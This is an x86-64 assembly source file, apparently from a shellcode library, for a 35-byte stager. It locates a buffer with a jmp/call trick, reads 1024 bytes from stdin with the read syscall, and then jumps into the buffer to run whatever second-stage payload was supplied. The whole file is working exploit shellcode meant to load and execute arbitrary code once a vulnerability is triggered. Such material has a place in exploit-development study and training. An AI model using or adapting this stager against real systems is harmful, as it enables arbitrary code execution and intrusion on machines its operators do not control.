/**
 * Simple stager contained into 35 bytes: read from stdin
 * untile reach the desired size and then jump to it.
 * 
 * The destination buffer is placed at the end of this shellcode.
 */

    jmp end_of_buffer
stager_1:
    /* now in the stack there is the address of the buffer */
    pop rsi
    /* resave for the end */
    push rsi
    push 0
    pop rdi
    push 1024
    pop rdx

/* read loop */
read_loop_2:
    /* call read('rdi', 'rsi', 'rdx') */
    /* moving rdi into rdi, but this is a no-op */
    /* moving rsi into rsi, but this is a no-op */
    /* moving rdx into rdx, but this is a no-op */
    xor eax, eax
    syscall
    sub rdx, rax
    add rsi, rax
    test rdx, rdx
    jne read_loop_2

    pop rsi /* start of mmaped buffer */
    call rsi /* jump and hope for it to work */
end_of_buffer:
    call stager_1

